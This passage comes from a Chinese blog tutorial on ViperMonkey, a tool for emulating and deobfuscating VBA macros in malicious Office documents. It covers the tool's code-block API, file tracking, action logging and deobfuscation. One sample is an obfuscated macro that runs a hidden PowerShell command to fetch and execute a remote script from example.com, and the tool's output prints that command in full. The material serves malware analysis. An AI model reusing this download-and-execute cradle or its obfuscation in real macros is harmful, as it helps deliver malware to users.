class="built_in">print</span> <span class="string">&#x27;FUNCTIONS and SUBS: &#x27;</span></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> module.procedures:</span><br><span class="line">    <span class="built_in">print</span> func.name</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FUNCTIONS and SUBS: </span><br><span class="line">Document_Open</span><br><span class="line">PrintHello</span><br></pre></td></tr></table></figure>
<h3 id="Code-Blocks"><a href="#Code-Blocks" class="headerlink" title="Code Blocks"></a>Code Blocks</h3><p>Module 对象是 CodeBlock 对象的一种类型，code block 是作为单元工作的任何逻辑 code block (例如，函数，子例程，循环，单行代码等)。每个 CodeBlock 对象中可以嵌入 0 个或多个 code blocks，可以使用 <code>.code_blocks</code> 属性对其进行迭代。</p>
<div class="tip "><p>提示：从技术上讲，CodeBlock 是 VBA_Object 类的封装，因此它可以提供按需获取检索已解析属性的方法。因此，code block 和 object 将互换使用。</p>
</div>
<ul>
<li><code>Module</code> 对象是顶级 code block</li>
<li>每个 code block 都有基于类型的不同属性 (可以使用 <code>.type</code> 属性确定)</li>
<li>可以使用 <code>str()</code> 访问给定 code block 的原始代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> code_block <span class="keyword">in</span> module.code_blocks:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;TYPE: &quot;</span>, code_block.<span class="built_in">type</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;CODE:\n&quot;</span>, <span class="built_in">str</span>(code_block)</span><br><span class="line">    <span class="keyword">if</span> code_block.<span class="built_in">type</span> == vipermonkey.Function:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Found a function: &#123;&#125;(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            code_block.name, <span class="string">&#x27;, &#x27;</span>.join(p.name <span class="keyword">for</span> p <span class="keyword">in</span> code_block.params))</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.statements.Attribute_Statement&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">Attribute VB_Name = &quot;ThisDocument&quot;</span><br><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.statements.Attribute_Statement&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">Attribute VB_Base = &quot;1Normal.ThisDocument&quot;</span><br><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.procedures.Sub&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">Sub Document_Open()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim message As String</span><br><span class="line">    message = PrintHello(&quot;Jamie&quot;)</span><br><span class="line">    MsgBox message</span><br><span class="line">End Sub</span><br><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.procedures.Function&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">Function PrintHello(person As String) As String</span><br><span class="line">    Dim m1 As String</span><br><span class="line">    m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span><br><span class="line">    PrintHello = m1 &amp; person</span><br><span class="line">End Function</span><br><span class="line">Found a function: PrintHello(person)</span><br></pre></td></tr></table></figure>
<div class="tip "><p>提示：没有解析函数中的任何代码，目的是提供按需解析，以加快处理速度。要解析一个函数，你需要检索该函数的 code block，然后对其内部的 code block 进行迭代。</p>
</div>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> code_block <span class="keyword">in</span> module.code_blocks:</span><br><span class="line">    <span class="keyword">if</span> code_block.<span class="built_in">type</span> == vipermonkey.Function:</span><br><span class="line">        <span class="keyword">for</span> inner_code_block <span class="keyword">in</span> code_block.code_blocks:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;TYPE: &quot;</span>, inner_code_block.<span class="built_in">type</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;CODE:\n&quot;</span>, <span class="built_in">str</span>(inner_code_block)</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.statements.Dim_Statement&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">    Dim m1 As String</span><br><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.statements.Let_Statement&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">    m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span><br><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.statements.Let_Statement&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">    PrintHello = m1 &amp; person</span><br></pre></td></tr></table></figure>
<h3 id="评估-Code-Blocks"><a href="#评估-Code-Blocks" class="headerlink" title="评估 Code Blocks"></a>评估 Code Blocks</h3><p>可以使用 eval() 或 load_context() 函数来评估各个 code block，这些函数接受 Context 对象作为参数，在评估时，将以递归方式评估所有嵌入的 code block。eval() 会运行一个正确范围内的 code block，并在适当的情况下返回结果。会对提供的 context 产生影响，为 eval() 提供上下文是可选的。例如，你可以遍历模块的 code block 以找到 PrintHello 函数，然后使用自己的参数对其进行评估</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> code_block <span class="keyword">in</span> module.code_blocks:</span><br><span class="line">    <span class="keyword">if</span> code_block.<span class="built_in">type</span> == vipermonkey.Function <span class="keyword">and</span> code_block.name == <span class="string">&#x27;PrintHello&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> code_block.<span class="built_in">eval</span>(params=[<span class="string">&#x27;Bob&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello Bob</span><br></pre></td></tr></table></figure>
<p>load_context() 直接在给定 context 的范围内评估 code block 的内容，这样你就可以在之后去检查 context。</p>
<p>load_context() 等效于分别评估每个 sub code block</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> sub_code_block <span class="keyword">in</span> code_block.code_blocks:</span><br><span class="line">   sub_code_block.<span class="built_in">eval</span>(context=context)</span><br></pre></td></tr></table></figure>
<p>在 Module 对象上使用此函数时，声明 Functions 和 Subs 时不会评估其外部的行。</p>
<p>使用上面已经声明的模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context = vipermonkey.Context()</span><br><span class="line">module.load_context(context)</span><br><span class="line"><span class="built_in">print</span> vipermonkey.<span class="built_in">eval</span>(<span class="string">&#x27;PrintHello(&quot;Bob&quot;)&#x27;</span>, context=context)</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello Bob</span><br></pre></td></tr></table></figure>
<h3 id="通用-CodeBlock-和-VBA-Object-类型"><a href="#通用-CodeBlock-和-VBA-Object-类型" class="headerlink" title="通用 CodeBlock 和 VBA_Object 类型"></a>通用 CodeBlock 和 VBA_Object 类型</h3><p>以下是你将遇到的一些常见 CodeBlock 或 VBA_Object 类型的列表</p>
<span class='p blue'>模块</span>
<p>顶层 Code blocks，包含所有全局变量和函数/子模块</p>
<ul>
<li><code>.functions</code> – Functions 中的 Code blocks</li>
<li><code>.sub - Subs</code> 中的 Code blocks (这些与 function 相同，但不返回任何内容)</li>
<li><code>.procedures</code> – Functions 和 Subs 中的 Code blocks</li>
<li><code>.entry_points</code> – 作为宏入口点 (Document_Open, AutoOpen 等等) 的 Functions/Subs</li>
<li><code>.global_vars</code> – 在模块中找到全局变量字典以及它们的值</li>
<li><code>.attribute</code> – 包含宏属性值的字典</li>
</ul>
<span class='p blue'>Function/Sub</span>
<ul>
<li><code>.name</code> – Function 或 Sub 的名称</li>
<li><code>.param</code> – 参数对象的列表</li>
<li><code>.return_type - function</code> 返回的变量类型 (只针对 Function)</li>
</ul>
<span class='p blue'>Call_Statement/Function_Call</span>
<p>调用给定的函数，可以在自己的行 (Call_Statement) 或另外行上的部分找到</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PrintHello(&quot;Bob&quot;)</span><br><span class="line">Shell &quot;powershell.exe ...&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>.name</code> – 所调用函数的名称或对象</li>
<li><code>.params</code> – 传递给函数的参数列表 (参数可以是字符串或其他对象)</li>
</ul>
<span class='p blue'>Global_Var_Statement</span>
<p>变量的声明</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo = <span class="string">&#x27;bar&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>.name</code> – 要设置的变量名称 (可以是诸如 <code>MemberAccessExpression</code> 之类的对象)</li>
<li><code>.value</code> – 值设置为变量 (可以是对象)</li>
</ul>
<span class='p blue'>Let_Statement</span>
<p>分配非对象值 (<code>Let</code> 关键字本身是可选的，可以省略)</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Let</span> PrintHello = m1 &amp; person</span><br></pre></td></tr></table></figure>
<ul>
<li><code>.name</code> – 变量名</li>
<li><code>.expression</code> – 要设置的变量的值</li>
<li><code>.index</code> – 变量的索引 ，可选的</li>
</ul>
<span class='p blue'>MemberAccessExpression</span>
<p>表示访问对象属性或函数的表达式</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThisDocument.Tables(<span class="number">1</span>).Cell(<span class="number">1</span>, <span class="number">1</span>).Range.<span class="keyword">Text</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>.lhs</code> – 第一个成员对象 (<code>ThisDocument</code>)</li>
<li><code>.rhs</code> – 其余成员的列表 (<code>[Tables(&#39;1&#39;), Cell(&#39;1, 1&#39;), &#39;Range&#39;, &#39;Text&#39;]</code>)</li>
</ul>
<h3 id="提取释放的文件"><a href="#提取释放的文件" class="headerlink" title="提取释放的文件"></a>提取释放的文件</h3><p><code>Context</code> 对象将跟踪创建的文件，使用 <code>opened_files</code> 或 <code>closed_files</code> 可实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Sub WriteFile(data As String)</span></span><br><span class="line"><span class="string">    Dim a, b, c As String</span></span><br><span class="line"><span class="string">    a = &quot;Scr&quot;</span></span><br><span class="line"><span class="string">    b = &quot;ipting&quot; &amp; Chr(46) &amp; &quot;FileSy&quot;</span></span><br><span class="line"><span class="string">    c = &quot;st&quot; &amp; Chr(69) &amp; &quot;mObject&quot;</span></span><br><span class="line"><span class="string">    Dim fso As Object</span></span><br><span class="line"><span class="string">    Set fso = CreateObject(a &amp; b &amp; c)</span></span><br><span class="line"><span class="string">    Dim Fileout As Object</span></span><br><span class="line"><span class="string">    Dim url As String</span></span><br><span class="line"><span class="string">    url = &quot;c:\users\public\&quot; &amp; &quot;documents\hello.txt&quot;</span></span><br><span class="line"><span class="string">    Set Fileout = fso.CreateTextFile(url, True, True)</span></span><br><span class="line"><span class="string">    Fileout.Write data</span></span><br><span class="line"><span class="string">    Fileout.Close</span></span><br><span class="line"><span class="string">End Sub</span></span><br><span class="line"><span class="string">WriteFile(&quot;This &quot; &amp; &quot;is some&quot; &amp; &quot; file data!&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context = vipermonkey.Context()</span><br><span class="line">vipermonkey.<span class="built_in">eval</span>(vba_code, context=context)</span><br><span class="line"><span class="built_in">print</span> context.closed_files</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;c:\\users\\public\\documents\\hello.txt&#x27;: &#x27;This is some file data!&#x27;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="替代函数"><a href="#替代函数" class="headerlink" title="替代函数"></a>替代函数</h3><p>Python 实现的一些函数可替代 Function 或 Sub，这有助于加快已知函数的解析速度，或替代由于复杂性而最有可能失败的函数。若要替代函数，请使用接受两个参数 (<code>context</code> 和 <code>params</code>) 的函数，用返回的结果来更新 Context 对象的全局字典值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Public Function Base64Decode(ByVal s As String) As Byte()</span></span><br><span class="line"><span class="string">    &#x27; Some complex code</span></span><br><span class="line"><span class="string">End Function</span></span><br><span class="line"><span class="string">Public Sub Document_Open()</span></span><br><span class="line"><span class="string">    Dim result As String</span></span><br><span class="line"><span class="string">    result = Base64Decode(&quot;aGVsbG8gd29ybGQh&quot;)</span></span><br><span class="line"><span class="string">Enc Sub</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replaced_base64</span>(<span class="params">context, params</span>):</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(params[<span class="number">0</span>])</span><br><span class="line">context = vipermonkey.Context()</span><br><span class="line">module = vipermonkey.Module(vba_code)</span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> The function should be replaced after the context is evaluated by the module. Otherwise the module will replace your function.</span></span><br><span class="line">module.load_context(context)</span><br><span class="line">context.<span class="built_in">globals</span>[<span class="string">&#x27;Base64Decode&#x27;</span>] = replaced_base64</span><br><span class="line">document_open = context[<span class="string">&#x27;Document_Open&#x27;</span>]</span><br><span class="line">document_open.load_context(context)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;DECODED DATA: &quot;</span>, context[<span class="string">&#x27;result&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DECODED DATA:  hello world!</span><br></pre></td></tr></table></figure>
<div class="tip "><p>提示：由于 Base64 的替代函数非常普遍，因此已经为你实现了此函数，可以使用 vipermonkey.Base64DecodeString</p>
</div>
<h3 id="记录行为"><a href="#记录行为" class="headerlink" title="记录行为"></a>记录行为</h3><p>在仿真模拟过程中，ViperMonkey 记录了独特而有趣的行为，这些行为会对外部系统产生影响 (例如，释放的文件，命令执行和 HTTP 请求)。可以从 Context 对象的 <code>.actions</code> 属性进行这些操作。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Public Function Execute() As Variant</span></span><br><span class="line"><span class="string">Dim m1, m2, m3, m4 As String</span></span><br><span class="line"><span class="string">m1 = &quot;p&quot; &amp; &quot;o&quot; &amp; &quot;w&quot; &amp; &quot;e&quot; &amp; &quot;r&quot; &amp; &quot;s&quot; &amp; &quot;h&quot; &amp; &quot;e&quot; &amp; &quot;l&quot; &amp; &quot;l&quot; &amp; &quot; &quot; &amp; &quot;-&quot; &amp; &quot;w&quot; &amp; &quot; &quot; &amp; &quot;h&quot; &amp; &quot;i&quot; &amp; &quot;d&quot; &amp; &quot;d&quot; &amp; &quot;e&quot;</span></span><br><span class="line"><span class="string">m2 = &quot;n&quot; &amp; &quot; -&quot; &amp; &quot;e&quot; &amp; &quot;x&quot; &amp; &quot;e&quot; &amp; &quot;c&quot; &amp; &quot; b&quot; &amp; &quot;y&quot; &amp; &quot;p&quot; &amp; &quot;a&quot; &amp; &quot;s&quot; &amp; &quot;s &quot; &amp; &quot;-&quot; &amp; &quot;c &quot; &amp; Chr(34)</span></span><br><span class="line"><span class="string">m3 = &quot;$a&quot; &amp; &quot;=&quot; &amp; &quot;Invoke&quot; &amp; &quot;-&quot; &amp; &quot;We&quot; &amp; &quot;bRequest&quot; &amp; &quot; ww&quot; &amp; &quot;w.example.com&quot; &amp; &quot;/&quot; &amp; &quot;scr&quot; &amp; &quot;ipt.txt&quot;</span></span><br><span class="line"><span class="string">m4 = &quot;; &quot; &amp; &quot;Inv&quot; &amp; &quot;ok&quot; &amp; &quot;e-Expr&quot; &amp; &quot;ession &quot; &amp; &quot;$&quot; &amp; &quot;a&quot; &amp; Chr(34) &amp; &quot;&quot;</span></span><br><span class="line"><span class="string">Shell m1 &amp; m2 &amp; m3 &amp; m4, vbHide</span></span><br><span class="line"><span class="string">WinExec &quot;wscript powershell.exe -x run.ps1&quot;, 0</span></span><br><span class="line"><span class="string">End Function</span></span><br><span class="line"><span class="string">Execute</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context = vipermonkey.Context()</span><br><span class="line">vipermonkey.<span class="built_in">eval</span>(vba_code, context=context)</span><br><span class="line"><span class="keyword">for</span> description, actions <span class="keyword">in</span> context.actions.iteritems():</span><br><span class="line">    <span class="built_in">print</span> description, <span class="string">&#x27;====&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> action <span class="keyword">in</span> actions:</span><br><span class="line">        <span class="built_in">print</span> action</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Shell function ====</span><br><span class="line">(&#x27;Execute Command&#x27;, &#x27;powershell -w hidden -exec bypass -c &quot;$a=Invoke-WebRequest www.example.com/script.txt; Invoke-Expression $a&quot;&#x27;)</span><br><span class="line">Interesting Function Call ====</span><br><span class="line">(&#x27;WinExec&#x27;, [&#x27;wscript powershell.exe -x run.ps1&#x27;, 0])</span><br><span class="line">Interesting Command Execution ====</span><br><span class="line">(&#x27;Run&#x27;, &#x27;wscript powershell.exe -x run.ps1&#x27;)</span><br></pre></td></tr></table></figure>
<p>你也可以在 Context 对象中提供自己的回调函数以记录行为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">report_shell</span>(<span class="params">action, params=<span class="literal">None</span>, description=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> action == <span class="string">&#x27;Execute Command&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;FOUND A COMMAND: &quot;</span>, params</span><br><span class="line">context = vipermonkey.Context(report_action=report_shell)</span><br><span class="line">vipermonkey.<span class="built_in">eval</span>(vba_code, context=context)</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOUND A COMMAND:  powershell -w hidden -exec bypass -c &quot;$a=Invoke-WebRequest www.example.com/script.txt; Invoke-Expression $a&quot;</span><br></pre></td></tr></table></figure>
<h3 id="提高速度"><a href="#提高速度" class="headerlink" title="提高速度"></a>提高速度</h3><p>当使用到一个属性 (<code>.type</code>，<code>.name</code>，<code>.params</code> 等) 或调用 <code>eval()</code> 时会对 CodeBlock 对象进行解析。但是，调用 <code>str()</code> 不会触发解析，你可以利用这一点来跳过多余的行或可用行，从而加快处理速度。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Dim SHxPqkwrGNbtKCbuMMuOwkEnjTCFyQYVofmDhUQO As String</span></span><br><span class="line"><span class="string">Dim HInhBKXjdKldXUzKfBJGXAlBvSvqyiFkewQMeKCj As String</span></span><br><span class="line"><span class="string">Dim pRFxhIaLPubbdOiMdqXdORFsxSLGEoyqXCaKHNtT As String</span></span><br><span class="line"><span class="string">Dim uKWKPzXumrqVToeYfOEBgPSGrPxQuHjXJJDWgfTU As String</span></span><br><span class="line"><span class="string">Dim mIJOHatpQXHVoIHwnThJcipbyvwvJqJeGduHDfgY As String</span></span><br><span class="line"><span class="string">Dim m1, m2, m3 As String</span></span><br><span class="line"><span class="string">m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span></span><br><span class="line"><span class="string">m2 = &quot;w&quot; &amp; Chr(111) &amp; &quot;rl&quot; &amp; Chr(123 Xor 31)</span></span><br><span class="line"><span class="string">m3 = &quot;!!!&quot;</span></span><br><span class="line"><span class="string">result = m1 &amp; 2 &amp; m3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context = vipermonkey.Context()</span><br><span class="line">module = vipermonkey.Module(vba_code)</span><br><span class="line"><span class="keyword">for</span> code_block <span class="keyword">in</span> module.code_blocks:</span><br><span class="line">    <span class="comment"># Skip parsing the large number of unnecessary variable declarations.</span></span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">&#x27;Dim [A-Za-z]&#123;40&#125; As String&#x27;</span>, <span class="built_in">str</span>(code_block)):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    code_block.<span class="built_in">eval</span>(context)</span><br><span class="line"><span class="built_in">print</span> context[<span class="string">&#x27;result&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world!!!</span><br></pre></td></tr></table></figure>
<h3 id="去混淆"><a href="#去混淆" class="headerlink" title="去混淆"></a>去混淆</h3><p>ViperMonkey 包含一个去混淆实用程序，可在仿真模拟之前帮助清理代码。这可以极大地帮助加快解析速度，若要使用，请在解析/模拟之前使用 <code>deobfuscate()</code> 函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ZOOP = Chr(123 Xor 11)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(122 Xor 14)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(109 Xor 4)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(99 Xor 13)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(97 Xor 6) &amp; Chr(34 Xor 12) &amp; Chr(67 Xor 5) &amp; Chr(109 Xor 4)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(109 Xor 1) + Chr(69) + Chr(81 Xor 2)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(107 Xor 18)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span> vipermonkey.deobfuscate(vba_code)</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZOOP = &quot;pting.FilESy&quot;</span><br></pre></td></tr></table></figure>
<p>除了上述这种方法外，你也可以通过在 <code>vipermonkey.eval()</code> 或 <code>vipermonkey.Module()</code> 中设置 <code>deobfuscate</code> 关键字参数来触发去混淆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vipermonkey.<span class="built_in">eval</span>(vba_code, deobfuscate=<span class="literal">True</span>)</span><br><span class="line">module = vipermonkey.Module(vba_code, deobfuscate=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>以上你都会了吗？</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">zeronohacker</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zeronohacker.github.io/2020/09/09/maldoc-analysis-tool-vipermonkey-instruction/">https://zeronohacker.github.io/2020/09/09/maldoc-analysis-tool-vipermonkey-instruction/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zeronohacker.github.io" target="_blank">zeronohacker</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Office/">Office</a><a class="post-meta__tags" href="/tags/ViperMonkey/">ViperMonkey</a><a class="post-meta__tags" href="/tags/VBA/">VBA</a></div><div class="post_share"><div class="social-share" data-image="https://image.zeronohacker.com/top_img/2020/09/09/media_ELBFukFX0AAZwGB.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/09/11/the-platform-module-in-python/"><img class="prev-cover" src="https://image.zeronohacker.com/top_img/2020/09/11/python-platform-module.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Python 中的 platform 